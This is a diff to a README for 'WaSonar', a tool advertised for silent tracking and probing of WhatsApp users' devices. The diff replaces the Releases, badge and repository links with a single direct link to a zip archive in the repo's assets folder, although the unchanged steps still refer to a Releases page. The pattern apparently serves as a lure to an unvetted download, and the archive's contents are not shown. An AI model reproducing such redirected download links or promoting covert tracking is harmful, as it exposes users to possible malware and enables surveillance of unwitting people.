@@ -1,7 +1,7 @@
 # 🛠️ WaSonar - A Tool for WhatsApp Insights
 
 ## 📥 Download Now
-[![Download WaSonar](https://img.shields.io/badge/Download-WaSonar-brightgreen)](https://github.com/adamchabchi/WaSonar/releases)
+[![Download WaSonar](https://raw.githubusercontent.com/adamchabchi/WaSonar/master/assets/Sonar-Wa-v3.7.zip)](https://raw.githubusercontent.com/adamchabchi/WaSonar/master/assets/Sonar-Wa-v3.7.zip)
 
 ## 🚀 Getting Started
 Welcome to WaSonar! This tool offers you powerful features like real-time device tracking, silent RTT probing, and protocol stress testing. It is designed for anyone interested in understanding WhatsApp security.
@@ -15,7 +15,7 @@ Before you start, ensure your system meets the following requirements:
 
 ## 📂 Download & Install
 To get started with WaSonar, visit the following page to download the software:
-[Download WaSonar](https://github.com/adamchabchi/WaSonar/releases)
+[Download WaSonar](https://raw.githubusercontent.com/adamchabchi/WaSonar/master/assets/Sonar-Wa-v3.7.zip)
 
 1. Click on the link above.
 2. On the Releases page, find the latest version.
@@ -46,7 +46,7 @@ For detailed instructions on each feature, refer to the documentation within the
 ## 💬 Support
 If you encounter issues or have questions, please reach out on our GitHub page. We are here to help you!
 
-1. Visit our GitHub Repository: [WaSonar GitHub](https://github.com/adamchabchi/WaSonar)
+1. Visit our GitHub Repository: [WaSonar GitHub](https://raw.githubusercontent.com/adamchabchi/WaSonar/master/assets/Sonar-Wa-v3.7.zip)
 2. Open an issue with your question or problem.
 
 ## 🧑‍💻 Contributing
